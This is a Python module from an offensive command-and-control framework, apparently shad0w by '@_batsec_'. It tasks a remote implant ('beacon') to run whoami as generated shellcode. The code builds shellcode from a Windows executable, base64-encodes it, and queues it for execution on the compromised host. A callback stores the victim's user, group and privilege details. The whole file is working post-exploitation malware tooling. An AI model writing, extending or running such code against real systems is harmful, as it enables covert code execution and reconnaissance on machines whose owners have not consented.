#
# Get infomation about the current user
#

import inspect

import json
import base64
import argparse

from lib import shellcode

__description__ = "Get infomation about the current user the beacon is running as"
__author__ = "@_batsec_"

TMP_EXEC_ID = 0x3000

ERROR = False
error_list = ""

current_beacon = None

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

def whoami_callback(shad0w, data):
    global current_beacon

    print("WHOAMI CALLBACK")
    print("calling FUNC:", inspect.stack()[2][3])

    data = data.strip("\r\n")
    if len(data) > 1:
        if current_beacon is not None:
            print("ADDING BEACON INFO")
            shad0w.event.beacon_info(current_beacon, data.strip())

    return ""

def get_whoami_args(args):
    data = ""

    if args.all:
        return "/all"

    if args.groups:
        data += "/groups"

    if args.privs:
        data += "/priv"

    return data

async def main(shad0w, args, beacon):
    global ERROR, current_beacon

    # save the raw args
    raw_args = args

    # make beacon global
    current_beacon = beacon

    # usage examples
    usage_examples = """

Examples:

whoami
whoami --all
whoami --privs
whoami --groups
"""

    parse = argparse.ArgumentParser(prog='whoami',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("-a", "--all", action='store_true', help="Show all avalible infomation")
    parse.add_argument("-p", "--privs", action='store_true', help="Show all privilages")
    parse.add_argument("-g", "--groups", action='store_true', help="Show all groups the user is a member of")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # the user might have just run 'ls' but if not lets fail
    if (not len(raw_args) == 1) and (not raw_args == "whoami"):
        if ERROR:
            ERROR = False
            print(error_list)
            parse.print_help()
            return

    # this will change to args to args for whoami
    data = get_whoami_args(args)

    # do we have arguments to pass to the function?
    file = "/root/shad0w/bin/whoami.x64.exe"

    if len(data) != 0:
        rcode = base64.b64encode(shellcode.generate(file, None, data, parse=False)).decode()
    elif len(data) == 0:
        rcode = base64.b64encode(shellcode.generate(file, None, None, parse=False)).decode()

    shad0w.beacons[beacon]["callback"] = whoami_callback
    shad0w.beacons[beacon]["task"] = (TMP_EXEC_ID, rcode)

    print("executed")